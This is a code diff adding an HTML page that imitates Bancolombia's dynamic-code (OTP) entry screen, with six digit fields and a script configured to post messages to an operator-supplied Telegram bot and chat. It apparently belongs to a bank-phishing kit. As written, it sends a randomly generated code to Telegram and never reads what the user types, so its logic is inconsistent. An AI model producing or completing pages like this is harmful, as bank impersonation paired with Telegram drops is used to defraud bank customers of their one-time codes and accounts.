@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clave Dinámica - Bancolombia</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body, html {
+            height: 100%;
+            width: 100%;
+            background-color: #f0f0f0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        .image-container {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: relative;
+        }
+        .image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .title-text {
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
+            width: 100%;
+        }
+        
+        .center-box {
+            position: absolute;
+            top: 55%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgb(255, 255, 255);
+            width: 290px;
+            height: 66px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 8px;
+        }
+        
+        .digits-container {
+            display: flex;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
+        }
+        
+        .digit-input {
+            width: 35px;
+            height: 45px;
+            border: none;
+            border-bottom: 2px solid #ffe100;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
+            background: transparent;
+        }
+        
+        .digit-input:focus {
+            border-bottom: 2px solid #210049;
+        }
+        
+        .button-container {
+            position: absolute;
+            top: 70.4%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            gap: 10px;
+        }
+        
+        .button-container button {
+            padding: 13px 35px;
+            font-size: 13px;
+            border: none;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .button-container button:first-child {
+            background-color: #ffffff;
+            border: 1px solid black;
+        }
+        
+        .button-container button:last-child {
+            background-color: #ffda37;
+            color: black;
+        }
+
+        /* Estilos para el modal de Telegram */
+        .telegram-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .telegram-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        .modal-content h3 {
+            color: #0088cc;
+            margin-bottom: 15px;
+        }
+
+        .modal-content p {
+            margin-bottom: 20px;
+            color: #333;
+            line-height: 1.5;
+        }
+
+        .clave-display {
+            font-size: 32px;
+            font-weight: bold;
+            color: #0088cc;
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            letter-spacing: 5px;
+        }
+
+        .close-modal {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="image-container">
+        <img src="img/cel11.jpg" alt="Background Image">
+        
+        <div class="title-text">Ingrese Clave Dinámica</div>
+        
+        <div class="center-box">
+            <div class="digits-container">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+            </div>
+        </div>
+        
+        <div class="button-container">
+            <button onclick="window.history.back()">Cancelar</button>
+            <button id="loginButton">Ingresar</button>
+        </div>
+    </div>
+
+    <!-- Modal para mostrar la clave de Telegram -->
+    <div class="telegram-modal" id="telegramModal">
+        <div class="modal-content">
+            <svg class="telegram-logo" viewBox="0 0 24 24" fill="#0088cc">
+                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.191l-1.83 8.725c-.129.586-.463.73-.938.456l-2.595-1.915-1.252 1.206c-.138.138-.255.255-.523.255l.187-2.843 4.812-4.401c.205-.187-.044-.29-.317-.104l-5.953 3.782-2.656-.83c-.577-.18-.587-.577.122-.875l10.345-3.99c.48-.17.9.128.75.875z"/>
+            </svg>
+            <h3>Clave Dinámica Enviada</h3>
+            <p>Tu clave dinámica ha sido enviada a tu Telegram</p>
+            <div class="clave-display" id="claveDisplay">123456</div>
+            <p>Revisa tu aplicación de Telegram para obtener la clave</p>
+            <button class="close-modal" onclick="closeTelegramModal()">Aceptar</button>
+        </div>
+    </div>
+
+    <script>
+        // Configuración de Telegram - REEMPLAZA CON TUS DATOS
+        const TELEGRAM_BOT_TOKEN = 'TU_BOT_TOKEN_AQUI'; // Ej: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz'
+        const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI'; // Ej: '123456789'
+
+        const digitInputs = document.querySelectorAll('.digit-input');
+        const loginButton = document.getElementById('loginButton');
+        const telegramModal = document.getElementById('telegramModal');
+        const claveDisplay = document.getElementById('claveDisplay');
+
+        // Generar clave dinámica aleatoria de 6 dígitos
+        function generarClaveDinamica() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        // Enviar mensaje a Telegram
+        async function enviarTelegram(mensaje) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                return result.ok;
+            } catch (error) {
+                console.error('Error enviando a Telegram:', error);
+                return false;
+            }
+        }
+
+        // Mostrar modal de Telegram
+        function mostrarTelegramModal(clave) {
+            claveDisplay.textContent = clave;
+            telegramModal.style.display = 'flex';
+        }
+
+        // Cerrar modal
+        function closeTelegramModal() {
+            telegramModal.style.display = 'none';
+        }
+
+        // Manejar entrada de dígitos
+        digitInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 1 && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace') {
+                    if (this.value === '' && index > 0) {
+                        digitInputs[index - 1].focus();
+                    }
+                }
+                
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    digitInputs[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+            });
+        });
+
+        // Manejar clic en botón Ingresar
+        loginButton.addEventListener('click', async () => {
+            const claveGenerada = generarClaveDinamica();
+            
+            // Enviar clave a Telegram
+            const mensaje = `🔐 <b>CLAVE DINÁMICA BANCOLOMBIA</b>\n\n` +
+                          `Tu clave dinámica es: <code>${claveGenerada}</code>\n\n` +
+                          `⏰ Válida por 5 minutos`;
+            
+            const enviado = await enviarTelegram(mensaje);
+            
+            if (enviado) {
+                mostrarTelegramModal(claveGenerada);
+            } else {
+                alert('Error al enviar la clave a Telegram. Verifica la configuración.');
+            }
+        });
+
+        // Enfocar el primer input al cargar
+        digitInputs[0].focus();
+    </script>
+</body>
+</html>
